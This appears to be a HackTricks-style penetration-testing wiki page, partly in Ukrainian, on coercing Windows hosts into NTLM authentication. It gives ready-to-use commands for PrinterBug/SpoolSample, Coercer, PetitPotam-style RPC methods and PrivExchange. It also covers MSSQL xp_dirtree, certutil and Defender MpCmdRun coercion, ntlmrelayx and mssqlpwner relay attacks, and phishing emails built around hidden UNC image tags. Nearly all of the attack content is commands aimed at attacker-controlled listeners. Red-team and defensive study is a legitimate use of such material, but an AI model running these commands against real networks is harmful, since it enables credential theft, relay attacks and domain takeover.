# Force NTLM Privileged Authentication

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) is a **collection** of **remote authentication triggers** coded in C# using MIDL compiler for avoiding 3rd party dependencies.

## Зловживання службою Spooler

If the _**Print Spooler**_ service is **enabled,** you can use some already known AD credentials to **request** to the Domain Controller’s print server an **update** on new print jobs and just tell it to **send the notification to some system**.\
Note when printer send the notification to an arbitrary systems, it needs to **authenticate against** that **system**. Therefore, an attacker can make the _**Print Spooler**_ service authenticate against an arbitrary system, and the service will **use the computer account** in this authentication.

Under the hood, the classic **PrinterBug** primitive abuses **`RpcRemoteFindFirstPrinterChangeNotificationEx`** over **`\\PIPE\\spoolss`**. The attacker first opens a printer/server handle and then supplies a fake client name in `pszLocalMachine`, so the target spooler creates a notification channel **back to the attacker-controlled host**. This is why the effect is **outbound authentication coercion** rather than direct code execution.\
If you are looking for **RCE/LPE** in the spooler itself, check [PrintNightmare](printnightmare.md). This page is focused on **coercion and relay**.

### Finding Windows Servers on the domain

Using PowerShell, get a list of Windows boxes. Servers are usually priority, so lets focus there:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
```
### Пошук служб Spooler, що слухають

Використовуючи трохи модифікований @mysmartlogin's (Vincent Le Toux's) [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket), перевірте, чи служба Spooler слухає:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Ви також можете використовувати `rpcdump.py` на Linux і шукати протокол **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Або швидко протестуйте хости з Linux за допомогою **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Якщо ви хочете **enumerate coercion surfaces** замість того, щоб просто перевіряти, чи існує spooler endpoint, використайте **Coercer scan mode**:
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Це корисно, тому що бачити endpoint у EPM лише означає, що print RPC interface зареєстровано. Це **не** гарантує, що кожен coercion method доступний з вашими поточними привілеями або що хост видасть придатний для використання authentication flow.

### Попросіть service пройти authentication проти довільного host

Ви можете скомпілювати [SpoolSample from here](https://github.com/NotMedic/NetNTLMtoSilverTicket).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
або використайте [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) або [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), якщо ви на Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
За допомогою **Coercer** ви можете напряму націлюватися на інтерфейси spooler і уникнути вгадування, який RPC method exposed:
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Примусове використання HTTP замість SMB з WebClient

Класичний PrinterBug зазвичай дає автентифікацію **SMB** до `\\attacker\share`, що все ще корисно для **capture**, **relay to HTTP targets** або **relay where SMB signing is absent**.\
Однак у сучасних середовищах relay **SMB to SMB** часто блокується через **SMB signing**, тому оператори часто надають перевагу примусовій автентифікації **HTTP/WebDAV** замість цього.

Якщо на цілі запущено службу **WebClient**, listener можна вказати у форматі, який змушує Windows використовувати **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Це особливо корисно під час chaining з **`ntlmrelayx --adcs`** або іншими HTTP relay targets, оскільки це дозволяє не покладатися на SMB relayability на примусовому з’єднанні. Важлива застереження: **WebClient must be running** на жертві, щоб варіант HTTP/WebDAV працював.

### Combining with Unconstrained Delegation

Якщо attacker уже скомпрометував computer з [Unconstrained Delegation](unconstrained-delegation.md), attacker міг би **змусити printer автентифікуватися проти цього computer**. Через unconstrained delegation, **TGT** облікового запису **computer account of the printer** буде **saved in** **memory** computer з unconstrained delegation. Оскільки attacker уже скомпрометував цей host, він зможе **отримати цей ticket** і abuse it ([Pass the Ticket](pass-the-ticket.md)).

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)

### RPC UNC-path coercion matrix (interfaces/opnums that trigger outbound auth)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchronous print interface on the same spooler pipe; use Coercer to enumerate reachable methods on a given host
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (also via \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce

Note: These methods accept parameters that can carry a UNC path (e.g., `\\attacker\share`). When processed, Windows will authenticate (machine/user context) to that UNC, enabling NetNTLM capture or relay.\
For spooler abuse, **MS-RPRN opnum 65** remains the most common and best-documented primitive because the protocol specification explicitly states that the server creates a notification channel back to the client specified by `pszLocalMachine`.

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)
- Effect: the target attempts to open the supplied backup log path and authenticates to the attacker-controlled UNC.
- Practical use: coerce Tier 0 assets (DC/RODC/Citrix/etc.) to emit NetNTLM, then relay to AD CS endpoints (ESC8/ESC11 scenarios) or other privileged services.

## PrivExchange

Атака `PrivExchange` є результатом flaw, виявленого у функції **Exchange Server `PushSubscription`**. Ця функція дозволяє примусити Exchange server автентифікуватися до будь-якого host, наданого client-side, через HTTP, якщо будь-який domain user має mailbox.

За замовчуванням, **Exchange service runs as SYSTEM** і має надмірні privileges (зокрема, він має **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Цю flaw можна використати, щоб увімкнути **relaying of information to LDAP and subsequently extract the domain NTDS database**. Якщо relay to LDAP неможливий, цю flaw все одно можна використати для relay і автентифікації до інших hosts у домені. Успішне використання цієї атаки надає негайний доступ до Domain Admin з будь-яким authenticated domain user account.

## Inside Windows

Якщо ви вже всередині Windows machine, ви можете примусити Windows підключитися до server, використовуючи privileged accounts з:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Або використайте цю іншу техніку: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Можна використати certutil.exe lolbin (Microsoft-signed binary), щоб примусити NTLM authentication:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML ін’єкція

### Через email

Якщо ви знаєте **email address** користувача, який входить на машину, яку ви хочете скомпрометувати, ви можете просто надіслати йому **email із зображенням 1x1**, наприклад
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
і коли він відкриє його, він спробує пройти автентифікацію.

### MitM

Якщо ви можете виконати MitM attack на computer і inject HTML у page, яку він буде переглядати, ви можете спробувати inject зображення, як-от таке, у page:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Інші способи примусити та phish NTLM authentication


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Cracking NTLMv1

If you can capture [NTLMv1 challenges read here how to crack them](../ntlm/index.html#ntlmv1-attack).\
_Пам’ятайте, що для того, щоб crack NTLMv1, вам потрібно встановити Responder challenge на "1122334455667788"_

## References
- [Unit 42 – Authentication Coercion Keeps Evolving](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [Microsoft – MS-EVEN: EventLog Remoting Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)

{{#include ../../banners/hacktricks-training.md}}
